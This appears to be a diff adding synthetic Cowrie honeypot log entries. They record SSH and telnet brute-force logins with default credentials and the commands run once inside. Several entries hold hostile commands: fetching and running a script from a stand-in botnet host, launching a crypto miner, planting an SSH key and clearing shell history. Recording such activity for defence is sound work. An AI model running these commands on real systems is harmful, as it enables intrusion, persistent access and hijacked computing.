+{"timestamp": "2026-11-03T21:48:00.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-03T21:48:00.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T21:48:01.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "admin"}
+{"timestamp": "2026-11-03T21:48:04.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "qwerty"}
+{"timestamp": "2026-11-03T21:48:08.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "user", "password": "qwerty"}
+{"timestamp": "2026-11-03T21:48:17.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-03T21:48:29.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-03T21:48:37.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-03T21:49:31.000000Z", "src_ip": "198.51.100.51", "session": "3de8acfe", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 102.3}
+{"timestamp": "2026-11-03T22:55:00.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 31354, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T22:55:00.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-03T22:55:00.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-03T22:55:05.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "12345678"}
+{"timestamp": "2026-11-03T22:55:06.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "password"}
+{"timestamp": "2026-11-03T22:55:10.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "admin", "password": "12345678"}
+{"timestamp": "2026-11-03T22:55:14.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-03T22:55:27.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-03T22:56:22.000000Z", "src_ip": "198.51.100.25", "session": "731cc115", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 101.3}
+{"timestamp": "2026-11-03T23:17:00.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 35914, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-03T23:17:00.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-03T23:17:00.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-03T23:17:03.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "root"}
+{"timestamp": "2026-11-03T23:17:06.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "root"}
+{"timestamp": "2026-11-03T23:17:08.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-03T23:17:13.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-03T23:17:30.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-03T23:17:48.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-03T23:18:05.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-03T23:18:09.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-03T23:19:34.000000Z", "src_ip": "203.0.113.100", "session": "1d3fb93c", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 118.9}
+{"timestamp": "2026-11-04T01:51:00.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 33852, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-04T01:51:04.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "admin"}
+{"timestamp": "2026-11-04T01:51:05.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "12345678"}
+{"timestamp": "2026-11-04T01:51:07.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-04T01:51:09.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "ubuntu"}
+{"timestamp": "2026-11-04T01:51:10.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "password"}
+{"timestamp": "2026-11-04T01:51:14.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "root"}
+{"timestamp": "2026-11-04T01:51:48.000000Z", "src_ip": "198.51.100.13", "session": "89366a37", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 12.3}
+{"timestamp": "2026-11-04T01:59:00.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 31040, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-04T01:59:00.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-04T01:59:00.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-04T01:59:04.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-04T01:59:06.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-04T01:59:24.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-04T01:59:42.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-04T01:59:55.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-04T02:00:17.000000Z", "src_ip": "203.0.113.108", "session": "39eda348", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 32.8}
+{"timestamp": "2026-11-04T02:07:00.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 49252, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-04T02:07:00.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-04T02:07:00.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-04T02:07:02.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "12345678"}
+{"timestamp": "2026-11-04T02:07:04.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "test", "password": "ubuntu"}
+{"timestamp": "2026-11-04T02:07:16.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-04T02:07:25.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-04T02:07:36.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-04T02:07:42.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-04T02:09:33.000000Z", "src_ip": "198.51.100.10", "session": "24ffac73", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 69.9}
+{"timestamp": "2026-11-04T04:05:00.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 37097, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-04T04:05:00.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-04T04:05:00.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-04T04:05:03.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "12345678"}
+{"timestamp": "2026-11-04T04:05:06.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "raspberry"}
+{"timestamp": "2026-11-04T04:05:08.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "qwerty"}
+{"timestamp": "2026-11-04T04:05:13.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "root"}
+{"timestamp": "2026-11-04T04:05:15.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "123456"}
+{"timestamp": "2026-11-04T04:05:19.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-04T04:05:22.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "password"}
+{"timestamp": "2026-11-04T04:05:32.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-04T04:05:56.000000Z", "src_ip": "198.51.100.13", "session": "4c67e570", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 61.3}
+{"timestamp": "2026-11-04T06:11:00.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 58675, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-04T06:11:00.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-04T06:11:00.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-04T06:11:01.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "qwerty"}
+{"timestamp": "2026-11-04T06:11:04.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-04T06:11:08.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "root"}
+{"timestamp": "2026-11-04T06:11:09.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-04T06:11:57.000000Z", "src_ip": "198.51.100.15", "session": "e6ac933f", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 83.6}
+{"timestamp": "2026-11-04T07:05:00.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 54689, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-04T07:05:00.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-04T07:05:00.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-04T07:05:01.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-04T07:05:06.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "password"}
+{"timestamp": "2026-11-04T07:05:10.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-04T07:05:13.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "postgres", "password": "ubuntu"}
+{"timestamp": "2026-11-04T07:05:22.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "free -m"}
+{"timestamp": "2026-11-04T07:06:40.000000Z", "src_ip": "198.51.100.12", "session": "120e8f44", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 47.1}
+{"timestamp": "2026-11-04T07:36:00.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 56295, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-04T07:36:00.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-04T07:36:00.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-04T07:36:04.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "pi", "password": "root"}
+{"timestamp": "2026-11-04T07:36:07.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-04T07:36:27.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-04T07:36:43.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-04T07:36:49.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "whoami"}
+{"timestamp": "2026-11-04T07:36:55.000000Z", "src_ip": "203.0.113.106", "session": "33574200", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 110.8}
+{"timestamp": "2026-11-04T14:12:00.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 40018, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-04T14:12:00.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-04T14:12:00.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-04T14:12:03.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "123456"}
+{"timestamp": "2026-11-04T14:12:07.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "admin", "password": "qwerty"}
+{"timestamp": "2026-11-04T14:12:23.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-04T14:12:26.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-04T14:13:14.000000Z", "src_ip": "198.51.100.15", "session": "fdd0ded4", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 95.8}
+{"timestamp": "2026-11-04T18:29:00.000000Z", "src_ip": "203.0.113.109", "session": "93b90dcb", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 42710, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-04T18:29:00.000000Z", "src_ip": "203.0.113.109", "session": "93b90dcb", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-04T18:29:00.000000Z", "src_ip": "203.0.113.109", "session": "93b90dcb", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-04T18:29:03.000000Z", "src_ip": "203.0.113.109", "session": "93b90dcb", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "raspberry"}
+{"timestamp": "2026-11-04T18:29:10.000000Z", "src_ip": "203.0.113.109", "session": "93b90dcb", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 31.4}
+{"timestamp": "2026-11-04T22:49:00.000000Z", "src_ip": "203.0.113.118", "session": "e4caf3a5", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 36579, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-04T22:49:00.000000Z", "src_ip": "203.0.113.118", "session": "e4caf3a5", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-04T22:49:00.000000Z", "src_ip": "203.0.113.118", "session": "e4caf3a5", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-04T22:49:03.000000Z", "src_ip": "203.0.113.118", "session": "e4caf3a5", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "admin"}
+{"timestamp": "2026-11-04T22:49:04.000000Z", "src_ip": "203.0.113.118", "session": "e4caf3a5", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "12345678"}
+{"timestamp": "2026-11-04T22:49:07.000000Z", "src_ip": "203.0.113.118", "session": "e4caf3a5", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "12345678"}
+{"timestamp": "2026-11-04T22:50:12.000000Z", "src_ip": "203.0.113.118", "session": "e4caf3a5", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 25.3}
+{"timestamp": "2026-11-05T01:16:00.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 42075, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T01:16:00.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-05T01:16:00.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-05T01:16:02.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "123456"}
+{"timestamp": "2026-11-05T01:16:18.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-05T01:16:24.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-05T01:16:24.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-05T01:16:34.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-11-05T01:16:54.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-05T01:18:13.000000Z", "src_ip": "203.0.113.132", "session": "51f5b7f9", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 75.9}
+{"timestamp": "2026-11-05T02:13:00.000000Z", "src_ip": "198.51.100.20", "session": "05f80ce6", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 32365, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-05T02:13:03.000000Z", "src_ip": "198.51.100.20", "session": "05f80ce6", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "123456"}
+{"timestamp": "2026-11-05T02:13:05.000000Z", "src_ip": "198.51.100.20", "session": "05f80ce6", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "12345678"}
+{"timestamp": "2026-11-05T02:14:07.000000Z", "src_ip": "198.51.100.20", "session": "05f80ce6", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 71.6}
+{"timestamp": "2026-11-05T03:50:00.000000Z", "src_ip": "198.51.100.14", "session": "bcd32198", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 59584, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T03:50:00.000000Z", "src_ip": "198.51.100.14", "session": "bcd32198", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-05T03:50:00.000000Z", "src_ip": "198.51.100.14", "session": "bcd32198", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T03:50:03.000000Z", "src_ip": "198.51.100.14", "session": "bcd32198", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "raspberry"}
+{"timestamp": "2026-11-05T03:51:11.000000Z", "src_ip": "198.51.100.14", "session": "bcd32198", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 27.1}
+{"timestamp": "2026-11-05T05:09:00.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 47139, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-05T05:09:00.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-05T05:09:00.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-05T05:09:02.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-05T05:09:03.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "root"}
+{"timestamp": "2026-11-05T05:09:07.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "root"}
+{"timestamp": "2026-11-05T05:09:11.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "test", "password": "123456"}
+{"timestamp": "2026-11-05T05:09:27.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-05T05:09:42.000000Z", "src_ip": "198.51.100.42", "session": "5dc141e4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
